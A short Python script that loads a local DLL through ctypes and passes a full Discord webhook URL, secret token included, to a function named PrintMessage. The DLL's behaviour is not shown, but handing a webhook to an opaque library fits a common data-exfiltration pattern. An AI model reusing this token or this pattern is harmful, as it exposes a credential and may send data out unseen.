import ctypes

# Load the DLL
mylibrary = ctypes.CDLL('./mylibrary.dll')

# Define the argument type (C string)
mylibrary.PrintMessage.argtypes = [ctypes.c_char_p]

# Call the PrintMessage function and pass a string
mylibrary.PrintMessage( b"https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe" )
